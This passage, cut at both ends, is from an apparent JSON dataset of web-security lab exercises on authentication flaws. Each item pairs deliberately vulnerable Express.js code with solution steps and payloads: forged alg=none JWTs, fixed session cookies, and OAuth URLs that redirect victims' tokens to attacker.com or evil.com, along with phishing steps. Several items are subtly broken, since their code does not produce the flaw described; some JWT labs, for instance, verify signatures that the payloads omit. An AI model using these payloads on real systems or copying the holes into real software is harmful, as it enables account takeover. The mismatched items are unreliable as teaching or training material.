    "srcCode": "const express = require('express'); const app = express(); app.post('/oauth/token', (req, res) => { const { code, redirect_uri } = req.body; const validCode = 'AUTHCODE123'; if (code === validCode) { return res.json({ access_token: 'access-token-for-carlos' }); } res.status(400).json({ error: 'Invalid code' }); }); app.get('/user/:id/profile', (req, res) => { if (req.headers.authorization === 'Bearer access-token-for-carlos') res.send('Carlos profile data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "POST /oauth/token { code=AUTHCODE123, redirect_uri=http://attacker.com/callback }",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab implements session-based authentication using a fixed session ID passed as a cookie. The application does not regenerate session IDs upon login, enabling session fixation attacks. To solve: set a session ID cookie before login, then trick Carlos into logging in with it and reuse the session.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set a cookie manually in the browser: sessionid=abc123 before visiting the login page.",
      "Use Burp Suite to intercept the login request and observe that the session ID remains unchanged after login.",
      "Send Carlos a phishing link that sets the sessionid=abc123 and directs him to the login page.",
      "After Carlos logs in, reuse the same sessionid=abc123 cookie in your browser.",
      "Access /my-account to retrieve Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.user === 'carlos') res.send('Carlos Account Info'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sessionid=abc123",
      "GET /login with sessionid=abc123",
      "GET /my-account with sessionid=abc123 after Carlos login"
    ]
  },
  {
    "Lab scenario": "JWT tampering using alg=none in Authorization header",
    "Lab Description": "This lab's authentication mechanism relies on JSON Web Tokens (JWTs) passed in the Authorization header. The server trusts the JWT without verifying the signature if the algorithm is set to 'none'. This allows tampering with token content. The application uses the JWT's 'role' claim to grant admin access. To solve: Modify the JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or a local script and inspect the header and payload.",
      "Modify the JWT header: change 'alg' to 'none'. In the payload, change 'role' to 'admin'.",
      "Remove the signature portion completely and base64 encode the new header and payload.",
      "Replace the original JWT in the Authorization header with the tampered one and access the /admin page to confirm escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); else return res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"}.{ \"username\": \"carlos\", \"role\": \"admin\" }"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow using predictable session ID",
    "Lab Description": "This lab suffers from a session fixation vulnerability. The session ID is set before login and remains unchanged after authentication. The attacker can pre-generate a session ID and trick the victim into using it. After the victim logs in, the attacker hijacks the session. To solve: Fixate Carlos's session and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to GET /session before login and extract the session cookie.",
      "Send the session ID to the victim (simulated) and have them log in via that session.",
      "After the victim logs in, reuse the same session ID in your cookies to access the /my-account endpoint.",
      "Use Burp Suite Repeater to send GET /my-account with the fixed session ID.",
      "Confirm access to the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user; res.redirect('/my-account'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { if (req.session?.user) return res.send(`Welcome ${req.session.user.username}`); else res.status(403).send('Login required'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login with fixed session cookie",
      "Cookie: connect.sid=sess123fixed",
      "Hijack connect.sid after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect leads to token theft",
    "Lab Description": "This lab's OAuth implementation incorrectly trusts arbitrary redirect_uris during the OAuth flow. By supplying a malicious redirect URI, an attacker can intercept the authorization code and exchange it for an access token. To solve: Capture Carlos's access token and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth authorization endpoint and confirm that any redirect_uri is accepted.",
      "Craft a malicious URL pointing the victim to the authorization endpoint with redirect_uri set to attacker.com.",
      "Simulate user click (victim logs in and consents) and intercept the authorization code sent to attacker.com.",
      "Exchange the stolen code using Postman or curl for an access token at the token endpoint.",
      "Use the access token in the Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthClients = [{ client_id: 'trusted-app', client_secret: 'abc123' }]; app.get('/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; res.redirect(`${redirect_uri}?code=1234`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id, client_secret } = req.body; if (code === '1234' && client_id === 'trusted-app' && client_secret === 'abc123') return res.json({ access_token: 'valid-token-for-carlos' }); res.status(400).send('Invalid request'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'valid-token-for-carlos') return res.send('Account details for Carlos'); else return res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "https://vulnerable.com/authorize?client_id=trusted-app&redirect_uri=https://attacker.com",
      "POST /token { code: 1234, client_id: trusted-app, client_secret: abc123 }",
      "Authorization: Bearer valid-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "RESTful JWT tampering in login endpoint",
    "Lab Description": "The application uses a JWT for authentication and verifies it using a public key. However, the algorithm field in the token header is not validated correctly, allowing attackers to manipulate it. The application blindly trusts unsigned tokens when 'alg' is set to 'none'. To solve: log in as the admin user and access the dashboard endpoint using a tampered token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT token via Postman while logging in with your own user credentials.",
      "Use jwt.io or Burp Suite to decode the token and analyze the header and payload.",
      "Change the alg field from 'RS256' to 'none' and modify the payload to {\"username\": \"admin\"}.",
      "Remove the signature section entirely and send the manipulated token in the Authorization header: Bearer <tampered_token>.",
      "Access the /admin/dashboard endpoint and confirm access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, publicKey); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}, Payload: {\"username\":\"admin\"}, no signature",
      "Authorization: Bearer <base64(header)>.<base64(payload)>.",
      "Token manipulation via jwt.io with RS256 → none and admin payload"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
    "Lab Description": "This application integrates third-party OAuth authentication but fails to validate redirect URIs. An attacker can craft an authorization URL with an open redirect in the redirect_uri parameter to intercept the authorization code. To solve: obtain the victim's authorization code and exchange it for an access token, then retrieve their email.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or OWASP ZAP to intercept the OAuth flow.",
      "Craft a malicious OAuth URL with redirect_uri set to https://malicious-site.com/oauth/callback.",
      "Send this URL to the victim (can simulate by pasting directly into the browser).",
      "Once the victim authenticates, capture the authorization code from the malicious site's endpoint.",
      "Exchange the stolen code for an access token using Postman and access the /userinfo endpoint to fetch victim data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const client_id = 'app123'; res.redirect(`https://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect_uri}`); }); app.get('/callback', async (req, res) => { const code = req.query.code; const token = await axios.post('https://oauth-provider.com/token', { code }); const userinfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userinfo.data.email}`); }); app.listen(4000, () => console.log('OAuth Lab running...'));",
    "payloads": [
      "https://target-site.com/auth?redirect_uri=https://evil.com/oauth/callback",
      "POST /token { code: <stolen_code> }",
      "GET /userinfo Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "SOAP API session fixation via pre-set cookie",
    "Lab Description": "The SOAP-based login endpoint accepts pre-set session IDs via cookies. The application does not regenerate session IDs after login. This allows an attacker to fix the session ID before victim logs in, then reuse it to impersonate the session. To solve: Fix a session ID, trick the victim to use it, and access the /myAccount endpoint as the victim.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman or Burp to send a GET /init-session request with a custom session ID in Cookie: sessionId=abc123.",
      "Trick the victim to log in using the same sessionId (simulate login with cookie set).",
      "After victim logs in, reuse Cookie: sessionId=abc123 to send a GET /myAccount request.",
      "Observe that you're now authenticated as the victim.",
      "Access /myAccount to confirm session fixation worked."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies['sessionId']; if (username === 'victim' && password === 'securepass') { sessions[sessionId] = username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/myAccount', (req, res) => { const user = sessions[req.cookies['sessionId']]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running...'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "POST /soap-login with sessionId=abc123 in cookie",
      "GET /myAccount with sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab demonstrates session fixation where the session ID is accepted from the user's request instead of being regenerated after login. The application uses a session token passed as a cookie and fails to rotate it after successful authentication, allowing attackers to hijack sessions. To solve: Fixate Carlos's session, then login as him using a pre-set session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to the login page and observe the 'sessionid' cookie being set by the client.",
      "Send a GET request to /login with a custom session ID: Cookie: sessionid=attackerSession123",
      "Log in using your own credentials and observe that the session ID is accepted and retained.",
      "Send the session fixation link with your controlled session ID to Carlos (assume simulated delivery).",
      "Once Carlos logs in via that link, reuse attackerSession123 as Cookie to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; const sessions = {}; app.get('/login', (req, res) => { const sessionid = req.cookies.sessionid || req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionid = req.cookies.sessionid; sessions[sessionid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionid = req.cookies.sessionid; const username = sessions[sessionid]; if (username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /login?sessionid=attackerSession123",
      "Cookie: sessionid=attackerSession123",
      "POST /login with username=carlos and password=abc123 using attackerSession123 cookie"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass using 'none' algorithm",
    "Lab Description": "This lab uses JWT tokens for authentication but fails to properly validate the algorithm field. It accepts tokens with the 'none' algorithm, allowing attackers to craft arbitrary tokens without a valid signature. To solve: Forge a token to impersonate Carlos and access the account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as your own user and capture the JWT token using Burp or Postman.",
      "Decode the token using jwt.io or jwt_tool to identify the structure.",
      "Modify the payload to change 'username' to 'carlos' and set 'alg' to 'none' in the header.",
      "Remove the signature entirely and rebase64 the header and payload manually.",
      "Send the forged token in the Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecretkey'); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "Forged token: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
    "Lab Description": "This lab simulates a vulnerable OAuth login where the redirect_uri is not properly validated. By manipulating the redirect_uri parameter, an attacker can intercept tokens issued to users. To solve: Steal Carlos's token and access the protected resource as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to analyze the OAuth flow when logging in via a third-party provider.",
      "Observe that redirect_uri is passed from the client and not strictly validated by the authorization server.",
      "Craft a malicious URL that points redirect_uri to your own domain: https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
      "Convince Carlos to visit the crafted link (social engineering assumed).",
      "Intercept the token at evil.com and reuse it in an Authorization: Bearer header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id !== '123') return res.status(403).send('Invalid client'); const token = 'token-for-carlos';  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-for-carlos') res.send('Welcome Carlos!'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
      "Intercepted token: token-for-carlos",
      "GET /my-account with Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set session cookie",
    "Lab Description": "The application uses session cookies to manage user authentication, but fails to regenerate them after login. A malicious actor can fix a known session ID before login, and force the victim to authenticate using it. The application reflects session IDs without regenerating them. To solve: hijack Carlos's session by fixing the session ID before he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Proxy to intercept GET /login and inject your custom session cookie (e.g. sessionid=abc123).",
      "Send the login page URL to Carlos (e.g. via social engineering) with the fixed sessionid embedded via Set-Cookie.",
      "Wait for Carlos to log in, using the sessionid you supplied.",
      "After he logs in, reuse the fixed sessionid to access authenticated pages.",
      "Verify access to /my-account as Carlos to confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cur3' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('sessionid', req.cookies.sessionid || Math.random().toString(36), { httpOnly: true }); return res.send('Login successful'); } return res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid) return res.send('Welcome back, session: ' + req.cookies.sessionid); res.status(401).send('Please login'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "sessionid=abc123",
      "Set-Cookie: sessionid=abc123",
      "GET /login HTTP/1.1 with Cookie header injection",
      "POST /login with attacker-supplied session ID"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authentication tokens",
    "Lab Description": "The app uses JWTs to authenticate users, but allows algorithm tampering in the header. It incorrectly trusts the 'alg' claim and accepts unsigned tokens when 'none' is specified. To solve: forge a valid token for Carlos without a signature.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT after logging in using Burp Suite or Postman.",
      "Decode the token header and change 'alg' to 'none'.",
      "Replace the 'sub' or 'username' claim to 'carlos'.",
      "Re-encode the JWT without a signature section.",
      "Submit the forged token in Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running...'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged-token>"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The application uses OAuth to log in users via a third-party provider. However, it fails to validate the redirect_uri parameter correctly, enabling attackers to steal tokens. The app reflects the redirect_uri without whitelisting. To solve: intercept the OAuth flow and capture Carlos's token.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and analyze the OAuth flow.",
      "Start an OAuth login and note the authorize request with the redirect_uri parameter.",
      "Change the redirect_uri to your own server (e.g., http://evil.com/callback).",
      "Send Carlos the modified authorization URL.",
      "Intercept the redirected request containing Carlos’s token at your server and use it to access his account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  return res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Lab running...'));",
    "payloads": [
      "redirect_uri=http://evil.com/callback",
      "https://target.com/auth?client_id=abc&redirect_uri=http://evil.com/callback&response_type=token",
      "Authorization URL with malicious redirect"
    ]
  },
  {
    "Lab scenario": "Insecure JWT validation in Authorization header (None algorithm tampering)",
    "Lab Description": "The application uses JWTs for user authentication and includes the token in the Authorization header. The server does not correctly verify the algorithm used to sign the JWT. The application trusts unsigned tokens if they specify 'alg':'none'. To solve: craft a tampered token impersonating 'carlos' and access the protected profile endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in and capture the JWT from the Authorization header.",
      "Use jwt.io or Burp Decoder to decode the token and observe the header with algorithm 'HS256'.",
      "Change the 'alg' to 'none' and remove the signature part, replacing it with an empty string.",
      "In Burp Repeater, modify the original Authorization header to use the tampered JWT with 'carlos' in the payload.",
      "Send the request to the /profile endpoint and verify if access is granted as 'carlos'."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const SECRET = 'supersecretkey'; app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Unauthorized'); const decoded = jwt.verify(token, SECRET); if (decoded.username !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome Carlos!'); }); app.listen(4000, () => console.log('JWT Lab on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leads to token hijacking via redirect_uri manipulation",
    "Lab Description": "The application uses OAuth 2.0 for third-party login integration. It implements the implicit flow and allows redirect_uri values to be manipulated without proper validation. An attacker can craft a malicious authorization URL to intercept access tokens. To solve: extract a valid access token for carlos and use it to access the user's dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate OAuth login and capture the redirect URL pattern and client_id/redirect_uri used.",
      "Construct a malicious redirect_uri under your control (e.g., attacker.com) and craft a full authorization URL.",
      "Send the authorization link to the victim (social engineering assumed or simulate as Carlos) to obtain the access token from the fragment.",
      "Use Postman to call /api/user with the stolen access token in the Authorization header.",
      "Verify successful access to the user dashboard as carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthClients = [{ client_id: 'trusted-client', redirect_uri: 'https://trusted.com/callback' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const client = oauthClients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Invalid client'); res.redirect(`${redirect_uri}#access_token=abc123&token_type=bearer`); }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Lab on http://localhost:4000'));",
    "payloads": [
      "https://auth.site.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in GraphQL login mutation",
    "Lab Description": "The application uses a GraphQL endpoint for login, but does not invalidate the session token upon authentication. This allows an attacker to set a fixed session before the victim logs in. To solve: Fixate a session, trick the victim into logging in, then reuse the session ID to access the user's data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send an initial unauthenticated request to /graphql to obtain a session cookie.",
      "Send the fixed session to the victim via phishing or simulate their login with the same session ID.",
      "Once the victim logs in, their session is tied to your predefined session ID.",
      "Replay the session cookie on the /graphql endpoint to access protected data.",
      "Query for { me { email, name } } to verify access to carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation login')) { const { username, password } = req.body.variables; if (username === 'carlos' && password === 'password') req.session.user = 'carlos'; return res.json({ data: { login: true } }); } if (query.includes('me')) { if (req.session.user === 'carlos') return res.json({ data: { me: { name: 'Carlos', email: 'carlos@example.com' } } }); return res.status(403).json({ error: 'Unauthorized' }); } res.status(400).send('Bad Request'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab on http://localhost:4000'));",
    "payloads": [
      "mutation login($username:String!, $password:String!) { login(username:$username, password:$password) }",
      "{ \"username\": \"carlos\", \"password\": \"password\" }",
      "query { me { name, email } }"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for user session management. It decodes the token and verifies it using the algorithm specified in the token header. The implementation trusts the 'alg' field from user-controlled input, making it vulnerable to algorithm confusion. The application treats unsigned tokens as valid. To solve: forge an unsigned JWT to impersonate the admin user and access /admin/dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT using Burp Suite or browser dev tools from the Authorization header.",
      "2. Decode the JWT using jwt.io or Postman and examine the header and payload.",
      "3. Modify the header to set 'alg' to 'none' and the payload 'user' to 'admin'. Remove the signature.",
      "4. Replace the original token in the Authorization header with the crafted token.",
      "5. Send the request to /admin/dashboard and verify access to the admin page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "{\"alg\":\"none\"}.{ \"user\":\"admin\" }",
      "Authorization: Bearer <JWT without signature>"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "The application issues a session cookie before authentication and does not regenerate the session ID after login. This allows an attacker to fix the session ID of a victim. The attacker can trick a victim into using a known session ID, and once they log in, the attacker can use the same session ID to hijack the session. To solve: gain access to Carlos's account using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate a session and capture the Set-Cookie header (e.g., sessionId=abc123).",
      "2. Trick the victim into visiting a crafted link that includes the known session cookie (e.g., by using a CSRF-like redirect or injecting a malicious image).",
      "3. Wait until the victim logs in with the attacker-fixed session ID.",
      "4. Use the same session cookie to send a GET request to /my-account.",
      "5. Verify access to Carlos's account and extract personal data from the page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Account page for ${username}`); else res.status(403).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "GET /?sessionId=abc123",
      "Hijack session after login using pre-set ID"
    ]
  },
  {
    "Lab scenario": "OAuth token theft using open redirect in callback URL",
    "Lab Description": "The application uses OAuth 2.0 with an implicit flow and accepts arbitrary redirect URIs after authorization. This introduces an open redirect vulnerability. An attacker can steal the access token by injecting a malicious redirect URL in the OAuth flow. To solve: craft a malicious OAuth URL that redirects the access token to an attacker-controlled domain and extract the token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start Burp Suite and inspect the login with Google OAuth flow.",
      "2. Notice that the redirect_uri parameter is not validated strictly by the server.",
      "3. Construct a malicious OAuth authorization URL that includes your domain (e.g., https://attacker.com/callback#access_token=... as the redirect_uri).",
      "4. Trick the victim into clicking the crafted URL (via phishing or injected content).",
      "5. Extract the token from the redirected request captured in your server logs or Burp Collaborator and use it to access protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const token = req.query.token; res.send(`Logged in with token: ${token}`); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
    "payloads": [
      "https://auth.example.com/oauth/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com/#access_token=steal",
      "OAuth redirect_uri=https://attacker.com#access_token=xyz",
      "Token leak via implicit flow redirection"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session validation middleware",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. However, it incorrectly trusts the 'alg' field in the JWT header without enforcing strict validation. The application uses these tokens to identify authenticated users. To solve: Forge a valid JWT for the user 'carlos' and access their My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the JWT after logging in with your own account using Burp Suite.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the use of 'alg': 'none'.",
      "Modify the JWT header to set 'alg' to 'none' and the payload to {\"username\": \"carlos\"}.",
      "Remove the JWT signature entirely and use Postman to submit an authenticated request with the modified token.",
      "Visit the /my-account endpoint while using the forged JWT to access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
